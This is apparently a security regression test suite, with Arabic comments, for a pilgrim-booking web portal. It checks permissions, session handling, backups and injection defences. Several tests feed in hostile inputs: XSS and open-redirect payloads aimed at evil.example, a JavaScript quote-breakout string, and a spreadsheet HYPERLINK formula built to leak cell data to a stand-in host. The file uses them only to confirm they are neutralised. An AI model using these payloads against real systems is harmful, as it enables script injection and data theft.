# -*- coding: utf-8 -*-
"""البورتال: إصلاحات الفحص الأمني (نوفمبر 2026) — صلاحيات المخيمات والأرشيف للمطّلع،
إنهاء الجلسات عند إعادة التعيين، قفل الحساب لا يحجب صاحبه، حذف ملفات التقارير
المؤقّتة، مفتاح ثابت لطلبات الحجز والآراء، وتنبيهات النسخ الاحتياطية والتخزين."""
import io, os, sys, tempfile, time
from datetime import date
from pathlib import Path
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
DATA = tempfile.mkdtemp(prefix="audit_fix_")
os.environ["HAJJ_DATA_DIR"] = DATA
for _k in ("RAILWAY_ENVIRONMENT_NAME", "RAILWAY_PROJECT_ID", "RAILWAY_VOLUME_MOUNT_PATH"):
    os.environ.pop(_k, None)
from hajj_app import auth, storage, app_mode  # noqa: E402
from hajj_app.mrz import PassportData  # noqa: E402
try:
    from webapp import server, backup, offsite
    server.app.config["CSRF_ENABLED"] = False
except ImportError as exc:
    print(f"[skip] مسارات الويب: {exc}"); print("ALL OK"); sys.exit(0)

owner, _rk = auth.create_account("owner", "Passw0rd!x")
auth.add_account(owner, "sara", "Passw0rd!s", role="editor")
auth.add_account(owner, "view", "Passw0rd!v", role="viewer")


def login(user, pw, ip="127.0.0.1", mode="umrah"):
    cl = server.app.test_client()
    r = cl.post("/login", data={"username": user, "password": pw, "mode": mode},
                environ_base={"REMOTE_ADDR": ip})
    assert r.status_code == 302, (user, r.status_code)
    return cl


c = login("owner", "Passw0rd!x")
v = login("view", "Passw0rd!v")
S = next(x for x in server._SESSIONS.values() if x.username == "owner")
storage.save_records([PassportData(full_name_ar="أحمد سالم العلي", passport_number="P100",
                                   phone="0501234567", uid="u1", sex="ذكر")], session=S)

# ---- ١) المطّلع لا يمسح تسكين المخيمات ولا يثبّت خياماً ----
ch = login("owner", "Passw0rd!x", mode="hajj")
vh = login("view", "Passw0rd!v", mode="hajj")
app_mode.set_mode(app_mode.HAJJ)
storage.save_records([PassportData(full_name_ar="حاج تجريبي", passport_number="H100",
                                   uid="h1", sex="ذكر")], session=S)
CAMPS = {"mina": {"assigned": [0], "number": 2}}
storage.save_camps(CAMPS, session=S)
for url, form in (("/camps/reset", {}), ("/camps/tents/reset", {"camp": "mina"}),
                  ("/camps/tents/export", {"camp": "mina", "count": "4"}),
                  ("/camps/tents/manual/assign", {"camp": "mina", "pick": "0"})):
    r = vh.post(url, data=form)
    assert r.status_code == 302 and "/camps" in r.headers.get("Location", ""), (url, r.status_code)
    app_mode.set_mode(app_mode.HAJJ)
    assert storage.load_camps(session=S) == CAMPS, ("المطّلع غيّر التسكين", url)
r = vh.get("/camps/tents?camp=mina")
assert r.status_code == 200, r.status_code
tents = r.get_data(as_text=True)
assert "/camps/tents/reset" not in tents and "/camps/tents/export" not in tents, "أزرار التعديل مخفية للمطّلع"
tents = ch.get("/camps/tents?camp=mina").get_data(as_text=True)
assert "/camps/tents/reset" in tents and "/camps/tents/export" in tents, "وظاهرة للمدير"
r = ch.post("/camps/reset")
app_mode.set_mode(app_mode.HAJJ)
assert r.status_code == 302 and not storage.load_camps(session=S), "المدير يمسح التسكين"
app_mode.set_mode(app_mode.UMRAH)

# ---- ٢) المطّلع يأخذ PDF المستند ولا يكتب في الأرشيف ----
n0 = len(storage.load_documents(session=S))
r = v.post("/documents/receipt/manual/pdf", json={"number": "9", "name": "س", "amount": "5"})
assert r.status_code == 200 and r.data[:4] == b"%PDF"
assert len(storage.load_documents(session=S)) == n0, "لا أرشفة من المطّلع"
r = c.post("/documents/receipt/manual/pdf", json={"number": "9", "name": "س", "amount": "5"})
assert len(storage.load_documents(session=S)) == n0 + 1, "المدير يؤرشف كالمعتاد"

# ---- ٣) إعادة تعيين كلمة المرور/الخطوتين من المدير تُنهي جلسات صاحب الحساب ----
e = login("sara", "Passw0rd!s")
assert e.get("/hujjaj").status_code == 200
c.post("/accounts/sara/password", data={"password": "NewPassw0rd!s"})
r = e.get("/hujjaj")
assert r.status_code == 302 and "/login" in r.headers["Location"], "جلسة المحرّر القديمة أُغلقت"
e = login("sara", "NewPassw0rd!s")
c.post("/accounts/sara/2fa-reset")
assert "/login" in e.get("/hujjaj").headers.get("Location", ""), "إلغاء الخطوتين يُنهي الجلسات"
assert c.get("/hujjaj").status_code == 200, "جلسة المدير نفسه باقية"

# ---- ٤) خمس محاولات خاطئة من الإنترنت لا تقفل صاحب الحساب على جهازه المعتاد ----
server._FAILS.clear()
dev = c.get_cookie("alm_dev")
assert dev is not None, "جهاز المدير معروف بعد الدخول"
bad = server.app.test_client()
for _ in range(5):
    bad.post("/login", data={"username": "owner", "password": "خطأ"},
             environ_base={"REMOTE_ADDR": "203.0.113.7"})
html = bad.post("/login", data={"username": "owner", "password": "Passw0rd!x"},
                environ_base={"REMOTE_ADDR": "203.0.113.8"}).get_data(as_text=True)
assert "أُوقف الدخول مؤقّتاً" in html, "المهاجم (جهاز غير معروف) يبقى موقوفاً"
mine = server.app.test_client()
mine.set_cookie("alm_dev", dev.value)
r = mine.post("/login", data={"username": "owner", "password": "Passw0rd!x"},
              environ_base={"REMOTE_ADDR": "198.51.100.4"})
assert r.status_code == 302, "صاحب الحساب يدخل من جهازه رغم القفل"
# جهاز معروف لحساب آخر لا يفتح القفل لهذا الحساب (الدخول الناجح فكّ القفل؛ نعيده)
for _ in range(5):
    bad.post("/login", data={"username": "owner", "password": "خطأ"},
             environ_base={"REMOTE_ADDR": "203.0.113.9"})
other = server.app.test_client()
other.set_cookie("alm_dev", v.get_cookie("alm_dev").value)
assert "أُوقف الدخول مؤقّتاً" in other.post(
    "/login", data={"username": "owner", "password": "Passw0rd!x"},
    environ_base={"REMOTE_ADDR": "198.51.100.5"}).get_data(as_text=True)
server._FAILS.clear()

# ---- ٥) ملفات التقارير المؤقّتة (كشوف كاملة) تُحذف بعد التنزيل ----
made = []
_orig = server.tempfile.mkstemp


def _spy(*a, **k):
    fd, p = _orig(*a, **k)
    made.append(p)
    return fd, p


server.tempfile.mkstemp = _spy
try:
    for url in ("/reports/pilgrims.xlsx", "/reports/pilgrims.pdf"):
        r = c.get(url)
        assert r.status_code == 200 and len(r.data) > 100, url
        r.close()
finally:
    server.tempfile.mkstemp = _orig
assert made, "التقارير تستعمل ملفات مؤقّتة"
assert not [p for p in made if os.path.exists(p)], ("بقيت ملفات مؤقّتة", made)

# ---- ٦) طلبات الحجز والآراء: مفتاح ثابت يُنسخ مع البيانات، وترحيل القديم ----
with server.app.test_request_context():
    # ملف قديم مشفّر بمفتاح SECRET_KEY كما كان سابقاً
    legacy = server._legacy_fernet("booking-requests")
    import json as _json
    server._book_path().write_bytes(legacy.encrypt(_json.dumps([{"id": "b1", "name": "خالد"}]).encode()))
    assert server._book_load() == [{"id": "b1", "name": "خالد"}], "يُقرأ الملف القديم"
    from cryptography.fernet import Fernet
    key = (Path(DATA) / "server_data.key").read_bytes()
    assert Fernet(key).decrypt(server._book_path().read_bytes()), "رُحِّل للمفتاح الثابت فوراً"
    # تغيّر SECRET_KEY لا يُضيّعها بعد الآن
    old_secret = server._session_secret
    server._session_secret = lambda: "secret-changed"
    try:
        assert server._book_load()[0]["name"] == "خالد", "لا تضيع إن تغيّر SECRET_KEY"
    finally:
        server._session_secret = old_secret
    server._rev_save([{"id": "r1", "text": "ممتاز"}])
    assert server._rev_load() == [{"id": "r1", "text": "ممتاز"}]
    # ملف لا يُفتح بأي مفتاح: يُنقل جانباً ولا يُكتب فوقه
    server._rev_path().write_bytes(b"garbage-not-fernet")
    assert server._rev_load() == []
    assert not server._rev_path().exists()
    assert list(Path(DATA).glob("reviews.enc.unreadable-*")), "الملف التالف محفوظ جانباً"
    server._rev_save([{"id": "r2"}])
names = [arc for _p, arc in backup._members(False)]
for nm in ("booking_requests.enc", "reviews.enc", "server_data.key"):
    assert nm in names, ("لا يُنسخ", nm)

# استعادة نسخة أقدم لا تحويها: طلبات الحجز الحالية تبقى
old_zip = Path(tempfile.mkdtemp()) / "old.zip"
import zipfile  # noqa: E402
with zipfile.ZipFile(old_zip, "w") as z:
    for p, arc in backup._members(False):
        if arc not in ("booking_requests.enc", "reviews.enc", "server_data.key"):
            z.write(p, arc)
backup.restore_zip(old_zip)
with server.app.test_request_context():
    assert server._book_load()[0]["name"] == "خالد", "استعادة نسخة قديمة لا تمسح طلبات الحجز"
    assert server._rev_load() == [{"id": "r2"}]

# ---- ٧) النسخ اليومية: فشلها لا يمرّ بصمت ويُعاد بعد ساعة ----
assert backup.daily_problem() == "", "توجد نسخة يومية حديثة"
_bz = backup.build_zip


def _boom(*a, **k):
    Path(a[0]).write_bytes(b"partial")
    raise OSError("No space left on device")


backup.build_zip = _boom
backup._LAST_CHECK.update(day=None, retry=0, err="")
try:
    try:
        backup.daily(date(2031, 1, 1))
        raise AssertionError("كان يجب أن يفشل")
    except OSError:
        pass
finally:
    backup.build_zip = _bz
assert not list(backup.snaps_dir().glob("*.tmp")), "لا يبقى ملف ناقص"
assert backup._LAST_CHECK["day"] is None and backup._LAST_CHECK["retry"] > time.time()
assert backup.daily(date(2031, 1, 1)) is None, "لا محاولة قبل مرور ساعة"
old = time.time() - 3 * 86400
for p in backup.list_snapshots():
    os.utime(p, (old, old))
msg = backup.daily_problem()
assert "متوقّفة" in msg and "No space" in msg, msg
page = c.get("/backup").get_data(as_text=True)
assert "النسخ اليومية متوقّفة" in page and "bk-problem" in page

# ---- ٨) النسخة الخارجية: تنبيه إن كانت غير مفعّلة أو متأخّرة ----
level, text = offsite.problem()
assert level == "warn" and "غير مفعّلة" in text
assert "النسخة خارج الخادم غير مفعّلة" in page
cfg = {"enabled": True, "pw": "x", "email": "a@gmail.com", "freq": "daily",
       "last_ok": time.time() - 5 * 86400, "last_err": ""}
offsite._save(cfg)
assert offsite.stale() and offsite.problem()[0] == "danger"
cfg["last_ok"] = time.time() - 3600
offsite._save(cfg)
assert not offsite.stale() and offsite.problem() == ("", "")
cfg.pop("last_ok"); cfg["since"] = time.time() - 3 * 86400
offsite._save(cfg)
assert offsite.stale(), "فُعّلت قبل ٣ أيام ولم تصل أي نسخة"
offsite._save({})

# ---- ٩) على Railway: تحذير إن لم تكن البيانات على قرص دائم ----
with server.app.test_request_context():
    assert server._storage_problem() == "", "خارج Railway لا تحذير"
    os.environ["RAILWAY_ENVIRONMENT_NAME"] = "production"
    try:
        assert "Volume" in server._storage_problem()
        os.environ["RAILWAY_VOLUME_MOUNT_PATH"] = tempfile.mkdtemp(prefix="vol_")
        assert "ليس على القرص الدائم" in server._storage_problem()
        os.environ["RAILWAY_VOLUME_MOUNT_PATH"] = str(Path(DATA).parent)
        assert server._storage_problem() == ""
        os.environ.pop("HAJJ_DATA_DIR")
        assert "HAJJ_DATA_DIR" in server._storage_problem()
    finally:
        os.environ["HAJJ_DATA_DIR"] = DATA
        for _k in ("RAILWAY_ENVIRONMENT_NAME", "RAILWAY_VOLUME_MOUNT_PATH"):
            os.environ.pop(_k, None)

# ---- ١٠) محرّر المستند: لا حقن من رابط «رجوع» ولا من البيانات المحفوظة ----
import re  # noqa: E402
from hajj_app import webdoc  # noqa: E402
c.post("/documents/treq/manual/pdf", json={"number": "MA-T0001", "guest_ar": "ضيف"})
did = storage.load_documents(session=S)[-1]["id"]
for bad in ('/"><img src=x onerror=alert(1)>', "/\t/evil.example", "/%09/evil.example",
            "//evil.example", "/\\evil.example", "javascript:alert(1)"):
    html = c.get(f"/archive/{did}/edit", query_string={"back": bad}).get_data(as_text=True)
    assert "<img src=x" not in html and "evil.example" not in html and "javascript:" not in html, bad
    assert 'href="/archive"' in html, bad
    assert server._safe_back(bad) == "", bad
assert server._safe_back("/hujjaj/12/docs") == "/hujjaj/12/docs"
evil = {"number": '","x":alert(1),"y":"', "guest_ar": "__TITLE__", "notes": "__BACK__</script><b>x",
        "phone": " "}
page = webdoc._doc_html(evil, [], 'عنوان "><img src=x>', "🚐", back_url="/archive")
data_js = re.search(r"const D = (.*?);\nconst SCHEMA", page, re.S).group(1)
import json as _json  # noqa: E402
assert _json.loads(data_js) == evil, "البيانات تبقى كما هي حرفياً"
assert "</script><b>" not in page and "__TITLE__" in data_js and "__BACK__" in data_js
assert '"><img src=x>' not in page and "&quot;&gt;&lt;img" in page, "العنوان مُهرَّب"
assert " " not in data_js

# ---- ١١) رسائل التأكيد في السطر: الرقم/الرمز نصّ لا شيفرة ----
tpl = open(os.path.join(os.path.dirname(server.__file__), "templates", "quotes_list.html"),
           encoding="utf-8").read()
snippet = re.search(r'onsubmit="return confirm\(\{\{.*?\}\}\);"', tpl).group(0)
out = server.app.jinja_env.from_string(snippet.replace("r.number", "x")).render(x="Q1'+alert(1)+'")
assert "'+alert" not in out and "\\u0027" in out, out
for name in ("accounts.html", "pricings_list.html", "programs.html", "program_edit.html", "sessions.html"):
    t = open(os.path.join(os.path.dirname(server.__file__), "templates", name), encoding="utf-8").read()
    assert not re.search(r"confirm\('[^']*\{\{", t), ("قيمة داخل confirm('…')", name)

# ---- ١٢) ترويسات الأمان، ومنع حفظ الصفحات الخاصة في ذاكرة المتصفّح ----
r = server.app.test_client().get("/login")
assert r.headers["X-Content-Type-Options"] == "nosniff" and r.headers["X-Frame-Options"] == "SAMEORIGIN"
assert r.headers["Referrer-Policy"] == "same-origin"
for url in ("/hujjaj", "/reports/pilgrims.xlsx"):
    r = c.get(url)
    assert "no-store" in r.headers.get("Cache-Control", ""), (url, r.headers.get("Cache-Control"))
    r.close()
assert "no-store" not in c.get("/static/style.css").headers.get("Cache-Control", "")

# ---- ١٣) حدّ حجم الطلب: 64MB عموماً، والاستعادة وحدها أكبر ----
r = server.app.test_client().post("/login", data=b"x" * (65 * 1024 * 1024),
                                  content_type="application/x-www-form-urlencoded")
assert r.status_code == 413, r.status_code
assert server._BIG_UPLOAD_ENDPOINTS.get("backup_restore", 0) >= 1024 ** 3

# ---- ١٤) حذف سجلّ يُلغي رابطه الخاص (/p/…) ----
from webapp import public  # noqa: E402
recs = storage.load_records(session=S)[0]
tok = public.person_token(app_mode.UMRAH, recs[0].uid, {"name": "أحمد"})
assert server.app.test_client().get(f"/p/{tok}").status_code == 200
fp = re.search(r'"_rec": "([^"]+)"', c.get("/doc/0/receipt").get_data(as_text=True)).group(1)
r = c.post("/hujjaj/0/delete", data={"fp": fp})
assert r.status_code == 302 and "deleted" in r.headers["Location"]
assert public.find_person(app_mode.UMRAH, recs[0].uid) is None
assert server.app.test_client().get(f"/p/{tok}").status_code == 404, "الرابط توقّف"

# ---- ١٥) Excel: اسم يبدأ بـ«=» يبقى نصّاً لا معادلة ----
from hajj_app import excel_io  # noqa: E402
from openpyxl import load_workbook  # noqa: E402
x = Path(tempfile.mkdtemp()) / "x.xlsx"
excel_io.export_excel([PassportData(full_name_ar='=HYPERLINK("https://evil/?d="&E3,"x")',
                                    passport_number="P9")], x)
ws = load_workbook(x).active
cells = [cl for row in ws.iter_rows() for cl in row if str(cl.value or "").startswith("=HYPERLINK")]
assert cells and all(cl.data_type == "s" for cl in cells), "لا معادلات في التصدير"

# ---- ١٦) PDF: «<» و«&» في الأسماء لا تُسقط التقرير ----
storage.save_records([PassportData(full_name_ar="سالم <علي> & أولاده", passport_number="P7",
                                   uid="u7", notes="ملاحظة <b>غامقة</b> & أخرى")], session=S)
r = c.get("/reports/pilgrims.pdf")
assert r.status_code == 200 and r.data[:4] == b"%PDF", r.status_code
r.close()

# ---- ١٧) صفحات الحجز العامة: لا يُعرض نصّ كُتب في الرابط ----
fake = "حوّل العربون إلى الحساب AE000"
assert fake not in server.app.test_client().get("/trips", query_string={"err": fake}).get_data(as_text=True)
assert server._book_err("اكتب الاسم الكامل") == "اكتب الاسم الكامل" and server._book_err(fake) == ""

# ---- ١٨) إغراق نموذج الحجز لا يمحو طلبات العملاء الجديدة ----
items = ([{"id": f"a{i}", "status": "archived"} for i in range(800)]
         + [{"id": f"n{i}", "status": "new"} for i in range(2100)])
kept = server._book_trim(items)
assert sum(1 for x in kept if x["status"] == "new") == 2100, "كل الطلبات الجديدة باقية"
assert len(kept) == 2100
small = [{"id": "1", "status": "archived"}]
assert server._book_trim(small) == small
print("ALL OK")
